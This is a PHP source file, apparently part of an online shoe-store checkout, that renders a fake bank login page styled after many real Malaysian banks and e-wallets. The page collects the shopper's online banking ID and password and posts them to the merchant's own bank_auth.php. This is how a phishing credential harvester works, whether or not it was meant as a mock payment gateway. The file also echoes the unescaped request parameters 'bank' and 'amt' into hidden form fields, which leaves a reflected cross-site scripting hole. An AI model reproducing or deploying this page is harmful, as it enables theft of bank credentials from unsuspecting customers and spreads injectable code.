<?php
// bank_portal.php
session_start();
$bank = $_GET['bank'] ?? 'MAYBANK';
$amt = $_GET['amt'] ?? '0.00';

$bank_config = [
    'MAYBANK' => [
        'name' => 'Maybank2u',
        'bg' => '#ffcc00',
        'color' => '#111',
        'gradient' => 'linear-gradient(135deg, #ffcc00 0%, #ffd733 100%)',
        'banner' => '#ffd835',
        'button' => '#000'
    ],
    'CIMB' => [
        'name' => 'CIMB Clicks',
        'bg' => '#d10100',
        'color' => '#fff',
        'gradient' => 'linear-gradient(135deg, #d10100 0%, #ff5353 100%)',
        'banner' => '#ff6767',
        'button' => '#fff'
    ],
    'PUBLIC' => [
        'name' => 'Public Bank',
        'bg' => '#0043a4',
        'color' => '#fff',
        'gradient' => 'linear-gradient(135deg, #0043a4 0%, #0072d4 100%)',
        'banner' => '#2763d7',
        'button' => '#fff'
    ],
    'RHB' => [
        'name' => 'RHB Bank',
        'bg' => '#db0000',
        'color' => '#fff',
        'gradient' => 'linear-gradient(135deg, #db0000 0%, #ff4d4d 100%)',
        'banner' => '#ff6666',
        'button' => '#fff'
    ],
    'AMBANK' => [
        'name' => 'AmBank',
        'bg' => '#ff8200',
        'color' => '#111',
        'gradient' => 'linear-gradient(135deg, #ff8200 0%, #ffb44d 100%)',
        'banner' => '#ffc573',
        'button' => '#111'
    ],
    'AFFIN' => [
        'name' => 'Affin Bank',
        'bg' => '#007a33',
        'color' => '#fff',
        'gradient' => 'linear-gradient(135deg, #007a33 0%, #38b76c 100%)',
        'banner' => '#1ca76f',
        'button' => '#fff'
    ],
    'ALLIANCE' => [
        'name' => 'Alliance Bank',
        'bg' => '#4b0082',
        'color' => '#fff',
        'gradient' => 'linear-gradient(135deg, #4b0082 0%, #7b2cbf 100%)',
        'banner' => '#6b3fb8',
        'button' => '#fff'
    ],
    'BOOST' => [
        'name' => 'Boost',
        'bg' => '#ff1661',
        'color' => '#fff',
        'gradient' => 'linear-gradient(135deg, #ff1661 0%, #ff6b97 100%)',
        'banner' => '#ff3f7a',
        'button' => '#fff'
    ],
    'UOB' => [
        'name' => 'UOB',
        'bg' => '#002366',
        'color' => '#fff',
        'gradient' => 'linear-gradient(135deg, #002366 0%, #3159a8 100%)',
        'banner' => '#194ea7',
        'button' => '#fff'
    ],
    'OCBC' => [
        'name' => 'OCBC Bank',
        'bg' => '#e42123',
        'color' => '#fff',
        'gradient' => 'linear-gradient(135deg, #e42123 0%, #ff6e6e 100%)',
        'banner' => '#ff4d5a',
        'button' => '#fff'
    ],
    'HSBC' => [
        'name' => 'HSBC',
        'bg' => '#eb0000',
        'color' => '#fff',
        'gradient' => 'linear-gradient(135deg, #eb0000 0%, #ff4d4d 100%)',
        'banner' => '#ff6e6e',
        'button' => '#fff'
    ],
    'SCB' => [
        'name' => 'Standard Chartered',
        'bg' => '#00bfa5',
        'color' => '#fff',
        'gradient' => 'linear-gradient(135deg, #00bfa5 0%, #66e1cd 100%)',
        'banner' => '#29c8b8',
        'button' => '#fff'
    ],
    'DBS' => [
        'name' => 'DBS',
        'bg' => '#ff3333',
        'color' => '#fff',
        'gradient' => 'linear-gradient(135deg, #ff3333 0%, #ff7f7f 100%)',
        'banner' => '#ff5d5d',
        'button' => '#fff'
    ],
    'BIM' => [
        'name' => 'Bank Islam',
        'bg' => '#007f3f',
        'color' => '#fff',
        'gradient' => 'linear-gradient(135deg, #007f3f 0%, #42af6a 100%)',
        'banner' => '#1fa06b',
        'button' => '#fff'
    ],
    'IMM' => [
        'name' => 'Bank Muamalat',
        'bg' => '#006c64',
        'color' => '#fff',
        'gradient' => 'linear-gradient(135deg, #006c64 0%, #00a28d 100%)',
        'banner' => '#009b86',
        'button' => '#fff'
    ],
    'BANK_MUAMALAT' => [
        'name' => 'Bank Muamalat',
        'bg' => '#006c64',
        'color' => '#fff',
        'gradient' => 'linear-gradient(135deg, #006c64 0%, #00a28d 100%)',
        'banner' => '#009b86',
        'button' => '#fff'
    ],
    'DEFAULT' => [
        'name' => 'FPX Online Banking',
        'bg' => '#333',
        'color' => '#fff',
        'gradient' => 'linear-gradient(135deg, #333 0%, #4a4a4a 100%)',
        'banner' => '#444',
        'button' => '#fff'
    ]
];
$style = $bank_config[$bank] ?? $bank_config['DEFAULT'];
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title><?php echo $style['name']; ?> - Login</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
</head>
<body style="background: radial-gradient(circle at top left, rgba(255,255,255,0.9), transparent 25%), radial-gradient(circle at bottom right, rgba(0,0,0,0.06), transparent 24%), <?php echo $style['gradient']; ?>; min-height: 100vh; display: flex; align-items: center; justify-content: center;">
    <div class="card shadow-lg" style="width: 420px; border-radius: 24px; overflow: hidden; border: 1px solid rgba(255,255,255,0.55); backdrop-filter: blur(12px);">
        <div class="p-5 text-center" style="background: <?php echo $style['gradient']; ?>; color: <?php echo $style['color']; ?>;">
            <div style="font-size: 0.8rem; letter-spacing: 1px; text-transform: uppercase; opacity: 0.85;"><?php echo $style['name']; ?></div>
            <h3 class="mb-2 fw-bold">Bank Login</h3>
            <p class="mb-0 small" style="opacity: 0.9;">Enter your login details to continue securely with <?php echo $style['name']; ?>.</p>
        </div>
        <div class="card-body p-4" style="background: rgba(255,255,255,0.95);">
            <div class="mb-4 text-center">
                <span class="badge rounded-pill" style="background: <?php echo $style['banner']; ?>; color: #fff; letter-spacing: 0.7px; font-size: 0.8rem; padding: 0.6rem 0.9rem;"><?php echo $style['name']; ?></span>
            </div>
            <p class="text-muted small text-center mb-4">Amount to be debited: <strong>RM <?php echo htmlspecialchars($amt); ?></strong></p>
            <form action="bank_auth.php" method="POST">
                <input type="hidden" name="bank" value="<?php echo $bank; ?>">
                <input type="hidden" name="amt" value="<?php echo $amt; ?>">
                <p class="text-muted small text-center">To: <strong>STRYDEX SPORT SHOES STORE</strong><br>Amount: <strong>RM <?php echo $amt; ?></strong></p>
                <div class="mb-3 text-start">
                    <label class="form-label small fw-bold">Online Banking ID</label>
                    <input type="text" name="bank_user" class="form-control py-2" placeholder="e.g. user123" autocomplete="off" required>
                </div>
                <div class="mb-4 text-start">
                    <label class="form-label small fw-bold">Password</label>
                    <input type="password" name="bank_pass" class="form-control py-2" placeholder="••••••••" autocomplete="off" required>
                </div>
                <button type="submit" class="btn w-100 py-2 fw-bold" style="background: <?php echo $style['bg']; ?>; color: <?php echo $style['color']; ?>;">LOGIN</button>
                <div class="text-center mt-3"><a href="checkout.php" class="text-decoration-none text-muted small">Cancel Transaction</a></div>
            </form>
        </div>
    </div>
</body>
</html>